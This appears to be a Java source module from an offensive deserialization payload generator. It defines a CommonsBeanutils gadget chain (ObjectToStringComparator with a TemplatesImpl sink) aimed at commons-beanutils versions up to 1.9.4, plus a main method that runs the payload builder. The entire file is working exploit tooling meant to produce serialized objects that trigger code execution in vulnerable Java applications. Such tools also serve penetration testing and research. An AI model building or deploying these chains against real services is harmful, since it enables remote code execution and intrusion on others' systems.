package com.ppp.chain.commonsbeanutils;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "org.apache.commons:commons-lang3"})
@Authors({Authors.DROPLET})
@Sink({Sink.TemplatesImpl})
public class CommonsBeanutilsObjectToStringComparator implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutilsObjectToStringComparator.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject, sinksHelper.getCBVersion());

        return kickOffObject;
    }

    public Object getChain(Object templates, String version) throws Exception {
        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ObjectToStringComparator, templates, version);
    }
}
